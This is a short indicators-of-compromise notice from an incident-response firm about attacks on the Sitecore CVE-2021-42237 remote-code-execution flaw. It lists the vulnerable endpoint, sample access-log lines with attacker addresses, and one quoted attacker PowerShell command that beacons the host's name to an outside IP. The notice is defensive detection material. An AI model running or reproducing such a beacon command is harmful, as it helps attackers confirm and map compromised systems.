# SiteCore CVE-2021-42237 exploitation IOCs
- Last update: 26.11.2021
- Author: HvS-Consulting AG

## Context
- We found those IOCs during incident response in November 2021. One of the analyzed systems was compromised via the SiteCore RCE CVE-2021-42237 (SiteCore Security Bulletin SC2021-003-499266). The vulnerability is located within the `/sitecore/shell/ClientBin/Reporting/Report.ashx` file. The access logs on affected systems might show similarities to following log lines:

    ```
    YYYY-MM-DD HH:mm:ss SYSTEM-IP POST /sitecore/shell/ClientBin/Reporting/Report.ashx - 443 - 209.58.185.232 python-requests/2.26.0 - 200 0 0 761
    YYYY-MM-DD HH:mm:ss SYSTEM-IP POST /sitecore/shell/ClientBin/Reporting/Report.ashx - 443 - 45.133.181.252 python-requests/2.26.0 - 200 0 0 1179
    YYYY-MM-DD HH:mm:ss SYSTEM-IP POST /sitecore/shell/ClientBin/Reporting/Report.ashx - 443 - 45.133.181.252 python-requests/2.26.0 - 200 0 0 1502
    ```
    Initial probes of the attacker did spawn a PowerShell process that performs a simple back connect including the FQDN of the system:
    ```
    powershell -c curl http://139[.]180[.]147[.]174:55505/?asfkj12fasf=https://FQDN
    ```

## Notes & Disclaimer
- Even if we try to avoid false positives by manual QA, those rules are not meant to be used in production without previous dry runs.

## References
- https://support.sitecore.com/kb?id=kb_article_view&sysparm_article=KB1000776
- https://blog.assetnote.io/2021/11/02/sitecore-rce/